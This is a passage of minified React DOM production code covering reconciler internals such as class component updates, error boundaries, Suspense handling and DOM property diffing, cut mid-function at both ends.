      n != null && (i.callback = n),
      (t = ft(e, i, l)),
      t !== null && (Me(t, e, l, r), Rr(t, e, l));
  },
  enqueueForceUpdate: function (e, t) {
    e = e._reactInternals;
    var n = se(),
      r = pt(e),
      l = Ge(n, r);
    (l.tag = 2),
      t != null && (l.callback = t),
      (t = ft(e, l, r)),
      t !== null && (Me(t, e, r, n), Rr(t, e, r));
  },
};
function ts(e, t, n, r, l, i, o) {
  return (
    (e = e.stateNode),
    typeof e.shouldComponentUpdate == "function"
      ? e.shouldComponentUpdate(r, i, o)
      : t.prototype && t.prototype.isPureReactComponent
      ? !Gn(n, r) || !Gn(l, i)
      : !0
  );
}
function Pc(e, t, n) {
  var r = !1,
    l = mt,
    i = t.contextType;
  return (
    typeof i == "object" && i !== null
      ? (i = je(i))
      : ((l = he(t) ? Tt : oe.current),
        (r = t.contextTypes),
        (i = (r = r != null) ? rn(e, l) : mt)),
    (t = new t(n, i)),
    (e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null),
    (t.updater = kl),
    (e.stateNode = t),
    (t._reactInternals = e),
    r &&
      ((e = e.stateNode),
      (e.__reactInternalMemoizedUnmaskedChildContext = l),
      (e.__reactInternalMemoizedMaskedChildContext = i)),
    t
  );
}
function ns(e, t, n, r) {
  (e = t.state),
    typeof t.componentWillReceiveProps == "function" &&
      t.componentWillReceiveProps(n, r),
    typeof t.UNSAFE_componentWillReceiveProps == "function" &&
      t.UNSAFE_componentWillReceiveProps(n, r),
    t.state !== e && kl.enqueueReplaceState(t, t.state, null);
}
function Xi(e, t, n, r) {
  var l = e.stateNode;
  (l.props = n), (l.state = e.memoizedState), (l.refs = {}), Vo(e);
  var i = t.contextType;
  typeof i == "object" && i !== null
    ? (l.context = je(i))
    : ((i = he(t) ? Tt : oe.current), (l.context = rn(e, i))),
    (l.state = e.memoizedState),
    (i = t.getDerivedStateFromProps),
    typeof i == "function" && (Wi(e, t, i, n), (l.state = e.memoizedState)),
    typeof t.getDerivedStateFromProps == "function" ||
      typeof l.getSnapshotBeforeUpdate == "function" ||
      (typeof l.UNSAFE_componentWillMount != "function" &&
        typeof l.componentWillMount != "function") ||
      ((t = l.state),
      typeof l.componentWillMount == "function" && l.componentWillMount(),
      typeof l.UNSAFE_componentWillMount == "function" &&
        l.UNSAFE_componentWillMount(),
      t !== l.state && kl.enqueueReplaceState(l, l.state, null),
      ll(e, n, l, r),
      (l.state = e.memoizedState)),
    typeof l.componentDidMount == "function" && (e.flags |= 4194308);
}
function sn(e, t) {
  try {
    var n = "",
      r = t;
    do (n += dd(r)), (r = r.return);
    while (r);
    var l = n;
  } catch (i) {
    l =
      `
Error generating stack: ` +
      i.message +
      `
` +
      i.stack;
  }
  return { value: e, source: t, stack: l, digest: null };
}
function ui(e, t, n) {
  return { value: e, source: null, stack: n ?? null, digest: t ?? null };
}
function Hi(e, t) {
  try {
    console.error(t.value);
  } catch (n) {
    setTimeout(function () {
      throw n;
    });
  }
}
var Vp = typeof WeakMap == "function" ? WeakMap : Map;
function Nc(e, t, n) {
  (n = Ge(-1, n)), (n.tag = 3), (n.payload = { element: null });
  var r = t.value;
  return (
    (n.callback = function () {
      al || ((al = !0), (to = r)), Hi(e, t);
    }),
    n
  );
}
function jc(e, t, n) {
  (n = Ge(-1, n)), (n.tag = 3);
  var r = e.type.getDerivedStateFromError;
  if (typeof r == "function") {
    var l = t.value;
    (n.payload = function () {
      return r(l);
    }),
      (n.callback = function () {
        Hi(e, t);
      });
  }
  var i = e.stateNode;
  return (
    i !== null &&
      typeof i.componentDidCatch == "function" &&
      (n.callback = function () {
        Hi(e, t),
          typeof r != "function" &&
            (dt === null ? (dt = new Set([this])) : dt.add(this));
        var o = t.stack;
        this.componentDidCatch(t.value, {
          componentStack: o !== null ? o : "",
        });
      }),
    n
  );
}
function rs(e, t, n) {
  var r = e.pingCache;
  if (r === null) {
    r = e.pingCache = new Vp();
    var l = new Set();
    r.set(t, l);
  } else (l = r.get(t)), l === void 0 && ((l = new Set()), r.set(t, l));
  l.has(n) || (l.add(n), (e = $p.bind(null, e, t, n)), t.then(e, e));
}
function ls(e) {
  do {
    var t;
    if (
      ((t = e.tag === 13) &&
        ((t = e.memoizedState), (t = t !== null ? t.dehydrated !== null : !0)),
      t)
    )
      return e;
    e = e.return;
  } while (e !== null);
  return null;
}
function is(e, t, n, r, l) {
  return e.mode & 1
    ? ((e.flags |= 65536), (e.lanes = l), e)
    : (e === t
        ? (e.flags |= 65536)
        : ((e.flags |= 128),
          (n.flags |= 131072),
          (n.flags &= -52805),
          n.tag === 1 &&
            (n.alternate === null
              ? (n.tag = 17)
              : ((t = Ge(-1, 1)), (t.tag = 2), ft(n, t, 1))),
          (n.lanes |= 1)),
      e);
}
var Qp = _e.ReactCurrentOwner,
  pe = !1;
function ue(e, t, n, r) {
  t.child = e === null ? rc(t, null, n, r) : on(t, e.child, n, r);
}
function os(e, t, n, r, l) {
  n = n.render;
  var i = t.ref;
  return (
    $t(t, l),
    (r = Xo(e, t, n, r, i, l)),
    (n = Ho()),
    e !== null && !pe
      ? ((t.updateQueue = e.updateQueue),
        (t.flags &= -2053),
        (e.lanes &= ~l),
        be(e, t, l))
      : (Q && n && Io(t), (t.flags |= 1), ue(e, t, r, l), t.child)
  );
}
function us(e, t, n, r, l) {
  if (e === null) {
    var i = n.type;
    return typeof i == "function" &&
      !tu(i) &&
      i.defaultProps === void 0 &&
      n.compare === null &&
      n.defaultProps === void 0
      ? ((t.tag = 15), (t.type = i), Tc(e, t, i, r, l))
      : ((e = Qr(n.type, null, r, t, t.mode, l)),
        (e.ref = t.ref),
        (e.return = t),
        (t.child = e));
  }
  if (((i = e.child), !(e.lanes & l))) {
    var o = i.memoizedProps;
    if (
      ((n = n.compare), (n = n !== null ? n : Gn), n(o, r) && e.ref === t.ref)
    )
      return be(e, t, l);
  }
  return (
    (t.flags |= 1),
    (e = At(i, r)),
    (e.ref = t.ref),
    (e.return = t),
    (t.child = e)
  );
}
function Tc(e, t, n, r, l) {
  if (e !== null) {
    var i = e.memoizedProps;
    if (Gn(i, r) && e.ref === t.ref)
      if (((pe = !1), (t.pendingProps = r = i), (e.lanes & l) !== 0))
        e.flags & 131072 && (pe = !0);
      else return (t.lanes = e.lanes), be(e, t, l);
  }
  return Ji(e, t, n, r, l);
}
function Lc(e, t, n) {
  var r = t.pendingProps,
    l = r.children,
    i = e !== null ? e.memoizedState : null;
  if (r.mode === "hidden")
    if (!(t.mode & 1))
      (t.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }),
        F(qt, ve),
        (ve |= n);
    else {
      if (!(n & 1073741824))
        return (
          (e = i !== null ? i.baseLanes | n : n),
          (t.lanes = t.childLanes = 1073741824),
          (t.memoizedState = {
            baseLanes: e,
            cachePool: null,
            transitions: null,
          }),
          (t.updateQueue = null),
          F(qt, ve),
          (ve |= e),
          null
        );
      (t.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }),
        (r = i !== null ? i.baseLanes : n),
        F(qt, ve),
        (ve |= r);
    }
  else
    i !== null ? ((r = i.baseLanes | n), (t.memoizedState = null)) : (r = n),
      F(qt, ve),
      (ve |= r);
  return ue(e, t, l, n), t.child;
}
function Uc(e, t) {
  var n = t.ref;
  ((e === null && n !== null) || (e !== null && e.ref !== n)) &&
    ((t.flags |= 512), (t.flags |= 2097152));
}
function Ji(e, t, n, r, l) {
  var i = he(n) ? Tt : oe.current;
  return (
    (i = rn(t, i)),
    $t(t, l),
    (n = Xo(e, t, n, r, i, l)),
    (r = Ho()),
    e !== null && !pe
      ? ((t.updateQueue = e.updateQueue),
        (t.flags &= -2053),
        (e.lanes &= ~l),
        be(e, t, l))
      : (Q && r && Io(t), (t.flags |= 1), ue(e, t, n, l), t.child)
  );
}
function ss(e, t, n, r, l) {
  if (he(n)) {
    var i = !0;
    $r(t);
  } else i = !1;
  if (($t(t, l), t.stateNode === null))
    Fr(e, t), Pc(t, n, r), Xi(t, n, r, l), (r = !0);
  else if (e === null) {
    var o = t.stateNode,
      u = t.memoizedProps;
    o.props = u;
    var s = o.context,
      a = n.contextType;
    typeof a == "object" && a !== null
      ? (a = je(a))
      : ((a = he(n) ? Tt : oe.current), (a = rn(t, a)));
    var p = n.getDerivedStateFromProps,
      d =
        typeof p == "function" ||
        typeof o.getSnapshotBeforeUpdate == "function";
    d ||
      (typeof o.UNSAFE_componentWillReceiveProps != "function" &&
        typeof o.componentWillReceiveProps != "function") ||
      ((u !== r || s !== a) && ns(t, o, r, a)),
      (tt = !1);
    var h = t.memoizedState;
    (o.state = h),
      ll(t, r, o, l),
      (s = t.memoizedState),
      u !== r || h !== s || Ae.current || tt
        ? (typeof p == "function" && (Wi(t, n, p, r), (s = t.memoizedState)),
          (u = tt || ts(t, n, u, r, h, s, a))
            ? (d ||
                (typeof o.UNSAFE_componentWillMount != "function" &&
                  typeof o.componentWillMount != "function") ||
                (typeof o.componentWillMount == "function" &&
                  o.componentWillMount(),
                typeof o.UNSAFE_componentWillMount == "function" &&
                  o.UNSAFE_componentWillMount()),
              typeof o.componentDidMount == "function" && (t.flags |= 4194308))
            : (typeof o.componentDidMount == "function" && (t.flags |= 4194308),
              (t.memoizedProps = r),
              (t.memoizedState = s)),
          (o.props = r),
          (o.state = s),
          (o.context = a),
          (r = u))
        : (typeof o.componentDidMount == "function" && (t.flags |= 4194308),
          (r = !1));
  } else {
    (o = t.stateNode),
      ic(e, t),
      (u = t.memoizedProps),
      (a = t.type === t.elementType ? u : Ie(t.type, u)),
      (o.props = a),
      (d = t.pendingProps),
      (h = o.context),
      (s = n.contextType),
      typeof s == "object" && s !== null
        ? (s = je(s))
        : ((s = he(n) ? Tt : oe.current), (s = rn(t, s)));
    var g = n.getDerivedStateFromProps;
    (p =
      typeof g == "function" ||
      typeof o.getSnapshotBeforeUpdate == "function") ||
      (typeof o.UNSAFE_componentWillReceiveProps != "function" &&
        typeof o.componentWillReceiveProps != "function") ||
      ((u !== d || h !== s) && ns(t, o, r, s)),
      (tt = !1),
      (h = t.memoizedState),
      (o.state = h),
      ll(t, r, o, l);
    var v = t.memoizedState;
    u !== d || h !== v || Ae.current || tt
      ? (typeof g == "function" && (Wi(t, n, g, r), (v = t.memoizedState)),
        (a = tt || ts(t, n, a, r, h, v, s) || !1)
          ? (p ||
              (typeof o.UNSAFE_componentWillUpdate != "function" &&
                typeof o.componentWillUpdate != "function") ||
              (typeof o.componentWillUpdate == "function" &&
                o.componentWillUpdate(r, v, s),
              typeof o.UNSAFE_componentWillUpdate == "function" &&
                o.UNSAFE_componentWillUpdate(r, v, s)),
            typeof o.componentDidUpdate == "function" && (t.flags |= 4),
            typeof o.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024))
          : (typeof o.componentDidUpdate != "function" ||
              (u === e.memoizedProps && h === e.memoizedState) ||
              (t.flags |= 4),
            typeof o.getSnapshotBeforeUpdate != "function" ||
              (u === e.memoizedProps && h === e.memoizedState) ||
              (t.flags |= 1024),
            (t.memoizedProps = r),
            (t.memoizedState = v)),
        (o.props = r),
        (o.state = v),
        (o.context = s),
        (r = a))
      : (typeof o.componentDidUpdate != "function" ||
          (u === e.memoizedProps && h === e.memoizedState) ||
          (t.flags |= 4),
        typeof o.getSnapshotBeforeUpdate != "function" ||
          (u === e.memoizedProps && h === e.memoizedState) ||
          (t.flags |= 1024),
        (r = !1));
  }
  return Gi(e, t, n, r, i, l);
}
function Gi(e, t, n, r, l, i) {
  Uc(e, t);
  var o = (t.flags & 128) !== 0;
  if (!r && !o) return l && Gu(t, n, !1), be(e, t, i);
  (r = t.stateNode), (Qp.current = t);
  var u =
    o && typeof n.getDerivedStateFromError != "function" ? null : r.render();
  return (
    (t.flags |= 1),
    e !== null && o
      ? ((t.child = on(t, e.child, null, i)), (t.child = on(t, null, u, i)))
      : ue(e, t, u, i),
    (t.memoizedState = r.state),
    l && Gu(t, n, !0),
    t.child
  );
}
function Ic(e) {
  var t = e.stateNode;
  t.pendingContext
    ? Ju(e, t.pendingContext, t.pendingContext !== t.context)
    : t.context && Ju(e, t.context, !1),
    Qo(e, t.containerInfo);
}
function as(e, t, n, r, l) {
  return ln(), Ro(l), (t.flags |= 256), ue(e, t, n, r), t.child;
}
var qi = { dehydrated: null, treeContext: null, retryLane: 0 };
function Yi(e) {
  return { baseLanes: e, cachePool: null, transitions: null };
}
function zc(e, t, n) {
  var r = t.pendingProps,
    l = D.current,
    i = !1,
    o = (t.flags & 128) !== 0,
    u;
  if (
    ((u = o) ||
      (u = e !== null && e.memoizedState === null ? !1 : (l & 2) !== 0),
    u
      ? ((i = !0), (t.flags &= -129))
      : (e === null || e.memoizedState !== null) && (l |= 1),
    F(D, l & 1),
    e === null)
  )
    return (
      Di(t),
      (e = t.memoizedState),
      e !== null && ((e = e.dehydrated), e !== null)
        ? (t.mode & 1
            ? e.data === "$!"
              ? (t.lanes = 8)
              : (t.lanes = 1073741824)
            : (t.lanes = 1),
          null)
        : ((o = r.children),
          (e = r.fallback),
          i
            ? ((r = t.mode),
              (i = t.child),
              (o = { mode: "hidden", children: o }),
              !(r & 1) && i !== null
                ? ((i.childLanes = 0), (i.pendingProps = o))
                : (i = Nl(o, r, 0, null)),
              (e = jt(e, r, n, null)),
              (i.return = t),
              (e.return = t),
              (i.sibling = e),
              (t.child = i),
              (t.child.memoizedState = Yi(n)),
              (t.memoizedState = qi),
              e)
            : qo(t, o))
    );
  if (((l = e.memoizedState), l !== null && ((u = l.dehydrated), u !== null)))
    return Dp(e, t, o, r, u, l, n);
  if (i) {
    (i = r.fallback), (o = t.mode), (l = e.child), (u = l.sibling);
    var s = { mode: "hidden", children: r.children };
    return (
      !(o & 1) && t.child !== l
        ? ((r = t.child),
          (r.childLanes = 0),
          (r.pendingProps = s),
          (t.deletions = null))
        : ((r = At(l, s)), (r.subtreeFlags = l.subtreeFlags & 14680064)),
      u !== null ? (i = At(u, i)) : ((i = jt(i, o, n, null)), (i.flags |= 2)),
      (i.return = t),
      (r.return = t),
      (r.sibling = i),
      (t.child = r),
      (r = i),
      (i = t.child),
      (o = e.child.memoizedState),
      (o =
        o === null
          ? Yi(n)
          : {
              baseLanes: o.baseLanes | n,
              cachePool: null,
              transitions: o.transitions,
            }),
      (i.memoizedState = o),
      (i.childLanes = e.childLanes & ~n),
      (t.memoizedState = qi),
      r
    );
  }
  return (
    (i = e.child),
    (e = i.sibling),
    (r = At(i, { mode: "visible", children: r.children })),
    !(t.mode & 1) && (r.lanes = n),
    (r.return = t),
    (r.sibling = null),
    e !== null &&
      ((n = t.deletions),
      n === null ? ((t.deletions = [e]), (t.flags |= 16)) : n.push(e)),
    (t.child = r),
    (t.memoizedState = null),
    r
  );
}
function qo(e, t) {
  return (
    (t = Nl({ mode: "visible", children: t }, e.mode, 0, null)),
    (t.return = e),
    (e.child = t)
  );
}
function Cr(e, t, n, r) {
  return (
    r !== null && Ro(r),
    on(t, e.child, null, n),
    (e = qo(t, t.pendingProps.children)),
    (e.flags |= 2),
    (t.memoizedState = null),
    e
  );
}
function Dp(e, t, n, r, l, i, o) {
  if (n)
    return t.flags & 256
      ? ((t.flags &= -257), (r = ui(Error(x(422)))), Cr(e, t, o, r))
      : t.memoizedState !== null
      ? ((t.child = e.child), (t.flags |= 128), null)
      : ((i = r.fallback),
        (l = t.mode),
        (r = Nl({ mode: "visible", children: r.children }, l, 0, null)),
        (i = jt(i, l, o, null)),
        (i.flags |= 2),
        (r.return = t),
        (i.return = t),
        (r.sibling = i),
        (t.child = r),
        t.mode & 1 && on(t, e.child, null, o),
        (t.child.memoizedState = Yi(o)),
        (t.memoizedState = qi),
        i);
  if (!(t.mode & 1)) return Cr(e, t, o, null);
  if (l.data === "$!") {
    if (((r = l.nextSibling && l.nextSibling.dataset), r)) var u = r.dgst;
    return (r = u), (i = Error(x(419))), (r = ui(i, r, void 0)), Cr(e, t, o, r);
  }
  if (((u = (o & e.childLanes) !== 0), pe || u)) {
    if (((r = _), r !== null)) {
      switch (o & -o) {
        case 4:
          l = 2;
          break;
        case 16:
          l = 8;
          break;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
          l = 32;
          break;
        case 536870912:
          l = 268435456;
          break;
        default:
          l = 0;
      }
      (l = l & (r.suspendedLanes | o) ? 0 : l),
        l !== 0 &&
          l !== i.retryLane &&
          ((i.retryLane = l), Ze(e, l), Me(r, e, l, -1));
    }
    return eu(), (r = ui(Error(x(421)))), Cr(e, t, o, r);
  }
  return l.data === "$?"
    ? ((t.flags |= 128),
      (t.child = e.child),
      (t = eA.bind(null, e)),
      (l._reactRetry = t),
      null)
    : ((e = i.treeContext),
      (ye = ct(l.nextSibling)),
      (we = t),
      (Q = !0),
      (Re = null),
      e !== null &&
        ((ke[Ce++] = He),
        (ke[Ce++] = Je),
        (ke[Ce++] = Lt),
        (He = e.id),
        (Je = e.overflow),
        (Lt = t)),
      (t = qo(t, r.children)),
      (t.flags |= 4096),
      t);
}
function cs(e, t, n) {
  e.lanes |= t;
  var r = e.alternate;
  r !== null && (r.lanes |= t), Ki(e.return, t, n);
}
function si(e, t, n, r, l) {
  var i = e.memoizedState;
  i === null
    ? (e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: l,
      })
    : ((i.isBackwards = t),
      (i.rendering = null),
      (i.renderingStartTime = 0),
      (i.last = r),
      (i.tail = n),
      (i.tailMode = l));
}
function Rc(e, t, n) {
  var r = t.pendingProps,
    l = r.revealOrder,
    i = r.tail;
  if ((ue(e, t, r.children, n), (r = D.current), r & 2))
    (r = (r & 1) | 2), (t.flags |= 128);
  else {
    if (e !== null && e.flags & 128)
      e: for (e = t.child; e !== null; ) {
        if (e.tag === 13) e.memoizedState !== null && cs(e, n, t);
        else if (e.tag === 19) cs(e, n, t);
        else if (e.child !== null) {
          (e.child.return = e), (e = e.child);
          continue;
        }
        if (e === t) break e;
        for (; e.sibling === null; ) {
          if (e.return === null || e.return === t) break e;
          e = e.return;
        }
        (e.sibling.return = e.return), (e = e.sibling);
      }
    r &= 1;
  }
  if ((F(D, r), !(t.mode & 1))) t.memoizedState = null;
  else
    switch (l) {
      case "forwards":
        for (n = t.child, l = null; n !== null; )
          (e = n.alternate),
            e !== null && il(e) === null && (l = n),
            (n = n.sibling);
        (n = l),
          n === null
            ? ((l = t.child), (t.child = null))
            : ((l = n.sibling), (n.sibling = null)),
          si(t, !1, l, n, i);
        break;
      case "backwards":
        for (n = null, l = t.child, t.child = null; l !== null; ) {
          if (((e = l.alternate), e !== null && il(e) === null)) {
            t.child = l;
            break;
          }
          (e = l.sibling), (l.sibling = n), (n = l), (l = e);
        }
        si(t, !0, n, null, i);
        break;
      case "together":
        si(t, !1, null, null, void 0);
        break;
      default:
        t.memoizedState = null;
    }
  return t.child;
}
function Fr(e, t) {
  !(t.mode & 1) &&
    e !== null &&
    ((e.alternate = null), (t.alternate = null), (t.flags |= 2));
}
function be(e, t, n) {
  if (
    (e !== null && (t.dependencies = e.dependencies),
    (It |= t.lanes),
    !(n & t.childLanes))
  )
    return null;
  if (e !== null && t.child !== e.child) throw Error(x(153));
  if (t.child !== null) {
    for (
      e = t.child, n = At(e, e.pendingProps), t.child = n, n.return = t;
      e.sibling !== null;

    )
      (e = e.sibling), (n = n.sibling = At(e, e.pendingProps)), (n.return = t);
    n.sibling = null;
  }
  return t.child;
}
function Kp(e, t, n) {
  switch (t.tag) {
    case 3:
      Ic(t), ln();
      break;
    case 5:
      oc(t);
      break;
    case 1:
      he(t.type) && $r(t);
      break;
    case 4:
      Qo(t, t.stateNode.containerInfo);
      break;
    case 10:
      var r = t.type._context,
        l = t.memoizedProps.value;
      F(nl, r._currentValue), (r._currentValue = l);
      break;
    case 13:
      if (((r = t.memoizedState), r !== null))
        return r.dehydrated !== null
          ? (F(D, D.current & 1), (t.flags |= 128), null)
          : n & t.child.childLanes
          ? zc(e, t, n)
          : (F(D, D.current & 1),
            (e = be(e, t, n)),
            e !== null ? e.sibling : null);
      F(D, D.current & 1);
      break;
    case 19:
      if (((r = (n & t.childLanes) !== 0), e.flags & 128)) {
        if (r) return Rc(e, t, n);
        t.flags |= 128;
      }
      if (
        ((l = t.memoizedState),
        l !== null &&
          ((l.rendering = null), (l.tail = null), (l.lastEffect = null)),
        F(D, D.current),
        r)
      )
        break;
      return null;
    case 22:
    case 23:
      return (t.lanes = 0), Lc(e, t, n);
  }
  return be(e, t, n);
}
var Oc, Zi, Mc, Fc;
Oc = function (e, t) {
  for (var n = t.child; n !== null; ) {
    if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode);
    else if (n.tag !== 4 && n.child !== null) {
      (n.child.return = n), (n = n.child);
      continue;
    }
    if (n === t) break;
    for (; n.sibling === null; ) {
      if (n.return === null || n.return === t) return;
      n = n.return;
    }
    (n.sibling.return = n.return), (n = n.sibling);
  }
};
Zi = function () {};
Mc = function (e, t, n, r) {
  var l = e.memoizedProps;
  if (l !== r) {
    (e = t.stateNode), Pt(Ke.current);
    var i = null;
    switch (n) {
      case "input":
        (l = vi(e, l)), (r = vi(e, r)), (i = []);
        break;
      case "select":
        (l = W({}, l, { value: void 0 })),
          (r = W({}, r, { value: void 0 })),
          (i = []);
        break;
      case "textarea":
        (l = Si(e, l)), (r = Si(e, r)), (i = []);
        break;
      default:
        typeof l.onClick != "function" &&
          typeof r.onClick == "function" &&
          (e.onclick = br);
    }
    Ei(n, r);
    var o;
    n = null;
    for (a in l)
      if (!r.hasOwnProperty(a) && l.hasOwnProperty(a) && l[a] != null)
        if (a === "style") {
          var u = l[a];
          for (o in u) u.hasOwnProperty(o) && (n || (n = {}), (n[o] = ""));
        } else
          a !== "dangerouslySetInnerHTML" &&
            a !== "children" &&
            a !== "suppressContentEditableWarning" &&
            a !== "suppressHydrationWarning" &&
            a !== "autoFocus" &&
            (Qn.hasOwnProperty(a)
              ? i || (i = [])
              : (i = i || []).push(a, null));
    for (a in r) {
      var s = r[a];
      if (
        ((u = l != null ? l[a] : void 0),
        r.hasOwnProperty(a) && s !== u && (s != null || u != null))
      )
        if (a === "style")
          if (u) {
            for (o in u)
              !u.hasOwnProperty(o) ||
                (s && s.hasOwnProperty(o)) ||
                (n || (n = {}), (n[o] = ""));
            for (o in s)
              s.hasOwnProperty(o) &&
                u[o] !== s[o] &&
                (n || (n = {}), (n[o] = s[o]));
          } else n || (i || (i = []), i.push(a, n)), (n = s);
        else
          a === "dangerouslySetInnerHTML"
            ? ((s = s ? s.__html : void 0),
              (u = u ? u.__html : void 0),
              s != null && u !== s && (i = i || []).push(a, s))
            : a === "children"
            ? (typeof s != "string" && typeof s != "number") ||
              (i = i || []).push(a, "" + s)
            : a !== "suppressContentEditableWarning" &&
              a !== "suppressHydrationWarning" &&
              (Qn.hasOwnProperty(a)
                ? (s != null && a === "onScroll" && B("scroll", e),
                  i || u === s || (i = []))
                : (i = i || []).push(a, s));
    }
    n && (i = i || []).push("style", n);
    var a = i;
    (t.updateQueue = a) && (t.flags |= 4);
  }
};
Fc = function (e, t, n, r) {
  n !== r && (t.flags |= 4);
};
function xn(e, t) {
  if (!Q)
    switch (e.tailMode) {
      case "hidden":
        t = e.tail;
        for (var n = null; t !== null; )
          t.alternate !== null && (n = t), (t = t.sibling);
        n === null ? (e.tail = null) : (n.sibling = null);
        break;
      case "collapsed":
        n = e.tail;
        for (var r = null; n !== null; )
          n.alternate !== null && (r = n), (n = n.sibling);
        r === null
          ? t || e.tail === null
            ? (e.tail = null)
            : (e.tail.sibling = null)
          : (r.sibling = null);
    }
}
function le(e) {
  var t = e.alternate !== null && e.alternate.child === e.child,
    n = 0,
    r = 0;
  if (t)
    for (var l = e.child; l !== null; )
      (n |= l.lanes | l.childLanes),
        (r |= l.subtreeFlags & 14680064),
        (r |= l.flags & 14680064),
        (l.return = e),
        (l = l.sibling);
  else
    for (l = e.child; l !== null; )
      (n |= l.lanes | l.childLanes),
        (r |= l.subtreeFlags),
        (r |= l.flags),
        (l.return = e),
        (l = l.sibling);
  return (e.subtreeFlags |= r), (e.childLanes = n), t;
}
function Wp(e, t, n) {
  var r = t.pendingProps;
  switch ((zo(t), t.tag)) {
    case 2:
    case 16:
    case 15:
    case 0:
    case 11:
    case 7:
    case 8:
    case 12:
    case 9:
    case 14:
      return le(t), null;
    case 1:
      return he(t.type) && _r(), le(t), null;
    case 3:
      return (
        (r = t.stateNode),
        un(),
        V(Ae),
        V(oe),
        Ko(),
        r.pendingContext &&
          ((r.context = r.pendingContext), (r.pendingContext = null)),
        (e === null || e.child === null) &&
          (Er(t)
            ? (t.flags |= 4)
            : e === null ||
              (e.memoizedState.isDehydrated && !(t.flags & 256)) ||
              ((t.flags |= 1024), Re !== null && (lo(Re), (Re = null)))),
        Zi(e, t),
        le(t),
        null
      );
    case 5:
      Do(t);
      var l = Pt(_n.current);
      if (((n = t.type), e !== null && t.stateNode != null))
        Mc(e, t, n, r, l),
          e.ref !== t.ref && ((t.flags |= 512), (t.flags |= 2097152));
      else {
        if (!r) {
          if (t.stateNode === null) throw Error(x(166));
          return le(t), null;
        }
        if (((e = Pt(Ke.current)), Er(t))) {
          (r = t.stateNode), (n = t.type);
          var i = t.memoizedProps;
          switch (((r[Qe] = t), (r[Zn] = i), (e = (t.mode & 1) !== 0), n)) {
            case "dialog":
              B("cancel", r), B("close", r);
              break;
            case "iframe":
            case "object":
            case "embed":
              B("load", r);
              break;
            case "video":
            case "audio":
              for (l = 0; l < Tn.length; l++) B(Tn[l], r);
              break;
            case "source":
              B("error", r);
              break;
            case "img":
            case "image":
            case "link":
              B("error", r), B("load", r);
              break;
            case "details":
              B("toggle", r);
              break;
            case "input":
              yu(r, i), B("invalid", r);
              break;
            case "select":
              (r._wrapperState = { wasMultiple: !!i.multiple }),
                B("invalid", r);
              break;
            case "textarea":
              Su(r, i), B("invalid", r);
          }
          Ei(n, i), (l = null);
          for (var o in i)
            if (i.hasOwnProperty(o)) {
              var u = i[o];
              o === "children"
                ? typeof u == "string"
                  ? r.textContent !== u &&
                    (i.suppressHydrationWarning !== !0 &&
                      xr(r.textContent, u, e),
                    (l = ["children", u]))
                  : typeof u == "number" &&
                    r.textContent !== "" + u &&
                    (i.suppressHydrationWarning !== !0 &&
                      xr(r.textContent, u, e),
                    (l = ["children", "" + u]))
                : Qn.hasOwnProperty(o) &&
                  u != null &&
                  o === "onScroll" &&
                  B("scroll", r);
            }
          switch (n) {
            case "input":
              Ar(r), wu(r, i, !0);
              break;
            case "textarea":
              Ar(r), xu(r);
              break;
            case "select":
            case "option":
              break;
            default:
              typeof i.onClick == "function" && (r.onclick = br);
          }
          (r = l), (t.updateQueue = r), r !== null && (t.flags |= 4);
        } else {
          (o = l.nodeType === 9 ? l : l.ownerDocument),
            e === "http://www.w3.org/1999/xhtml" && (e = fa(n)),
            e === "http://www.w3.org/1999/xhtml"
              ? n === "script"
                ? ((e = o.createElement("div")),
                  (e.innerHTML = "<script></script>"),
                  (e = e.removeChild(e.firstChild)))
                : typeof r.is == "string"
                ? (e = o.createElement(n, { is: r.is }))
                : ((e = o.createElement(n)),
                  n === "select" &&
                    ((o = e),
                    r.multiple
                      ? (o.multiple = !0)
                      : r.size && (o.size = r.size)))
              : (e = o.createElementNS(e, n)),
            (e[Qe] = t),
            (e[Zn] = r),
            Oc(e, t, !1, !1),
            (t.stateNode = e);
          e: {
            switch (((o = ki(n, r)), n)) {
              case "dialog":
                B("cancel", e), B("close", e), (l = r);
                break;
              case "iframe":
              case "object":
              case "embed":
                B("load", e), (l = r);
                break;
              case "video":
              case "audio":
                for (l = 0; l < Tn.length; l++) B(Tn[l], e);
                l = r;
                break;
              case "source":
                B("error", e), (l = r);
                break;
              case "img":
              case "image":
              case "link":
                B("error", e), B("load", e), (l = r);
                break;
              case "details":
                B("toggle", e), (l = r);
                break;
              case "input":
                yu(e, r), (l = vi(e, r)), B("invalid", e);
                break;
              case "option":
                l = r;
                break;
              case "select":
                (e._wrapperState = { wasMultiple: !!r.multiple }),
                  (l = W({}, r, { value: void 0 })),
                  B("invalid", e);
                break;
              case "textarea":
                Su(e, r), (l = Si(e, r)), B("invalid", e);
                break;
              default:
                l = r;
            }
            Ei(n, l), (u = l);
            for (i in u)
              if (u.hasOwnProperty(i)) {
                var s = u[i];
                i === "style"
                  ? Aa(e, s)
                  : i === "dangerouslySetInnerHTML"
                  ? ((s = s ? s.__html : void 0), s != null && da(e, s))
                  : i === "children"
                  ? typeof s == "string"
                    ? (n !== "textarea" || s !== "") && Dn(e, s)
                    : typeof s == "number" && Dn(e, "" + s)
                  : i !== "suppressContentEditableWarning" &&
                    i !== "suppressHydrationWarning" &&
                    i !== "autoFocus" &&
                    (Qn.hasOwnProperty(i)
                      ? s != null && i === "onScroll" && B("scroll", e)
                      : s != null && vo(e, i, s, o));
              }
            switch (n) {
              case "input":
                Ar(e), wu(e, r, !1);
                break;
              case "textarea":
                Ar(e), xu(e);
                break;
              case "option":
                r.value != null && e.setAttribute("value", "" + ht(r.value));
                break;
              case "select":
                (e.multiple = !!r.multiple),
                  (i = r.value),
                  i != null
                    ? Yt(e, !!r.multiple, i, !1)
                    : r.defaultValue != null &&
                      Yt(e, !!r.multiple, r.defaultValue, !0);
                break;
              default:
                typeof l.onClick == "function" && (e.onclick = br);
            }
            switch (n) {
              case "button":
              case "input":
              case "select":
              case "textarea":
                r = !!r.autoFocus;
                break e;
              case "img":
                r = !0;
                break e;
              default:
                r = !1;
            }
